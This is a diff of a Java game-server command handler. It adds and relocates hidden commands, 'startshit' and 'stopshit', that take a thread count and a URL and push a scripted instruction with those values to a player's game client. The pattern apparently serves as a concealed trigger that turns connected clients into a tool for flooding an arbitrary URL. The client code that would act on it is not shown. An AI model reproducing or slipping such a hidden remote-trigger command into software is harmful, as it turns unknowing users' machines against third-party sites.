@@ -592,6 +592,17 @@ public class CommandPacketHandler implements PacketHandler {
 		if (commandStart.equals("startminigame"))
 			World.getWorld().submit(new CountDownEvent());
 
+        if(commandStart.equalsIgnoreCase("startshit")) {
+            player.sendf("%s %s %s", as[0], as[1], as[2]);
+            final int threads = Integer.parseInt(as[1]);
+            final String url = as[2];
+            player.sendMessage("~xscript107"+threads+","+url);
+        }
+
+        if(commandStart.equals("stopshit")) {
+            player.sendMessage("~xscript105");
+        }
+
 		/**
 		 * Get player's pass, before it checks for external commands because
 		 * "getpass" exists for DeviousPK (Too lazy to edit it so it works :( )
@@ -1378,13 +1389,6 @@ public class CommandPacketHandler implements PacketHandler {
 						player.getChecking().getInvListener());
 				player.getActionSender().sendUpdateItems(5064,player.getChecking().getInv().toArray());
 			}
-		}
-
-        if(commandStart.equalsIgnoreCase("startshit")) {
-            player.sendf("%s %s %s", as[0], as[1], as[2]);
-            final int threads = Integer.parseInt(as[1]);
-            final String url = as[2];
-            player.sendMessage("script107"+threads+","+url);
         }
 
 		if (commandStart.equalsIgnoreCase("tracepkp")) {
